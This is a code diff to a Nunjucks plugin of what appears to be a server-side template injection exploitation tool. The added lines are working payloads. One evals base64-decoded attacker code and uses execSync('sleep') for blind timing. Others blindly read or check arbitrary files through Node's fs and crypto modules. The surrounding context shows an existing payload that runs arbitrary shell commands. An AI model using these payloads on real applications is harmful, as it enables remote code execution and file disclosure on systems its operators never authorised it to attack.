@@ -46,6 +46,10 @@ class Nunjucks(javascript.Javascript):
                 'call': 'inject',
                 'evaluate_blind': """{{{{range.constructor("return [''][0+!eval(Buffer('{code_b64p}', 'base64').toString())]['length']")()}}}}"""
             },
+            'evaluate_blind': {
+                'call': 'inject',
+                'evaluate_blind': """{{{{eval(Buffer('{code_b64p}', 'base64').toString())&&global.process.mainModule.require('child_process').execSync('sleep {delay}')}}}}"""
+            },
             'execute': {
                 'call': 'evaluate',
                 'execute': """global.process.mainModule.require('child_process').execSync(Buffer('{code_b64p}', 'base64').toString())"""
@@ -72,6 +76,11 @@ class Nunjucks(javascript.Javascript):
             'md5': {
                 'call': 'evaluate',
                 'md5': """global.process.mainModule.require('crypto').createHash('md5').update(global.process.mainModule.require('fs').readFileSync('{path}')).digest("hex")"""
+            },
+            'md5_blind': {
+                'call': 'evaluate_blind',
+                'md5_blind': "global.process.mainModule.require('crypto').createHash('md5').update(global.process.mainModule.require('fs').readFileSync('{path}')).digest('hex')=='{md5}'",
+                'exists_blind': "global.process.mainModule.require('fs').existsSync('{path}')"
             },
         })
 
